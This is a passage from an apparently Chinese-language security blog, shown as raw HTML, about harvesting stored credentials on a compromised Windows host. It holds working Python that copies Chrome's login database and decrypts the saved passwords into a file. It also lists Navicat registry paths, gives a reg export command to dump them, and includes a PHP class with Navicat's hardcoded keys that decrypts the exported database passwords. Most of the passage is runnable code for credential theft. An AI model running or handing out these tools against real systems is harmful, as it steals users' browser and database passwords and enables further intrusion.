class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        <span class="variable language_">self</span>.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = <span class="variable language_">self</span>.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            <span class="variable language_">self</span>.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(<span class="variable language_">self</span>.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h4><h5 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h5><p>目前测试只能解密11和12两个版本，其他版本未测试</p><p>数据库类型  -  注册表路径<br>MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers<br>-MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers<br>-MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers<br>-Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers<br>-Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers<br>-PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers<br>-SQLite HKEY_CURRENT_USER\Software\PremiumSoft\Navicat-SQLite\Servers<br>能RDP连接到机器</p><p>当前已Mysql作为测试样例，通过注册列表中查看，位置如下<br>\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41817.99t56b15zy.jpg" alt="Alt pic"></p><p>接着把加密的密码复制出来进行解密，脚本如下，如果本机没有PHP环境可以使用<a href="https://tool.lu/coderunner/">在线网站</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">FatSmallTools</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowKey = <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowIv = <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">decryptBlock</span>(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FatSmallTools</span>\<span class="title">NavicatPassword</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> <span class="title class_">NavicatPassword</span>(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//填上你的加密的密码</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="string">&#x27;EF176B08C2D7735DB81C&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="不能RDP连接到机器"><a href="#不能RDP连接到机器" class="headerlink" title="不能RDP连接到机器"></a>不能RDP连接到机器</h4><p>使用命令来保存注册列表的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKCU\SOFTWARE\PremiumSoft\Navicat\Servers navicat</span><br></pre></td></tr></table></figure><p>提取出来的内容如下，解密方式和上面一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\test]</span><br><span class="line">&quot;ConnType&quot;=&quot;ctMYSQL&quot;</span><br><span class="line">&quot;ConnTypeOra&quot;=&quot;ctoBasic&quot;</span><br><span class="line">&quot;TNS&quot;=&quot;&quot;</span><br><span class="line">&quot;DatabaseFileName&quot;=&quot;&quot;</span><br><span class="line">&quot;Host&quot;=&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Port&quot;=dword:00000cea</span><br><span class="line">&quot;InitialDatabase&quot;=&quot;&quot;</span><br><span class="line">&quot;OraServiceNameType&quot;=&quot;snServiceName&quot;</span><br><span class="line">&quot;MSSQLAuthenMode&quot;=&quot;mamSQLServer&quot;</span><br><span class="line">&quot;UserName&quot;=&quot;root&quot;</span><br><span class="line">&quot;Pwd&quot;=&quot;EF176B08C2D7735DB81C&quot;</span><br><span class="line">&quot;AskPassword&quot;=&quot;false&quot;</span><br><span class="line">&quot;Codepage&quot;=dword:0000fde9</span><br><span class="line">&quot;OraRole&quot;=&quot;orDefault&quot;</span><br><span class="line">&quot;OraOSAuthentication&quot;=dword:00000000</span><br><span class="line">&quot;AutoConnect&quot;=dword:00000000</span><br><span class="line">&quot;QuerySavePath&quot;=&quot;C:\\Users\\ascotbe\\Documents\\Navicat\\MySQL\\servers\\test&quot;</span><br><span class="line">&quot;UseCompression&quot;=dword:00000000</span><br><span class="line">&quot;UseCharacterSet&quot;=dword:00000001</span><br><span class="line">&quot;UsePingInterval&quot;=dword:00000000</span><br><span class="line">&quot;PingInterval&quot;=dword:000000f0</span><br><span class="line">&quot;UseNamedPipe&quot;=dword:00000000</span><br><span class="line">&quot;NamedPipeSocket&quot;=&quot;/tmp/mysql.sock&quot;</span><br><span class="line">&quot;SQLiteEncrypted&quot;=dword:00000000</span><br><span class="line">&quot;UseEncryption&quot;=dword:00000000</span><br><span class="line">&quot;UseAdvSettings&quot;=&quot;false&quot;</span><br><span class="line">&quot;UseSSL&quot;=dword:00000000</span><br><span class="line">&quot;UseSSLAuthen&quot;=dword:00000000</span><br><span class="line">&quot;PGSSLMode&quot;=&quot;smRequire&quot;</span><br><span class="line">&quot;ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;VerifyCACert&quot;=dword:00000000</span><br><span class="line">&quot;Cipher&quot;=&quot;&quot;</span><br><span class="line">&quot;PGSSLCRL&quot;=&quot;&quot;</span><br><span class="line">&quot;UseSSH&quot;=dword:00000000</span><br><span class="line">&quot;SSH_Host&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_Port&quot;=dword:00000016</span><br><span class="line">&quot;SSH_UserName&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_AuthenMethod&quot;=&quot;saPassword&quot;</span><br><span class="line">&quot;SSH_SavePassword&quot;=dword:00000000</span><br><span class="line">&quot;SSH_PrivateKey&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_SavePassphrase&quot;=dword:00000000</span><br><span class="line">&quot;UseHTTP&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_URL&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_EncodeBase64&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Authen&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Username&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpSavePassword&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_CertAuth&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Passphrase&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Proxy&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyHost&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ProxyPort&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyUsername&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpProxySavePassword&quot;=dword:00000000</span><br><span class="line">&quot;NSYID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYHash&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYNavicatID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYDirtyFlag&quot;=dword:00000000</span><br><span class="line">&quot;AskForSavePassword&quot;=dword:00000000</span><br></pre></td></tr></table></figure><h3 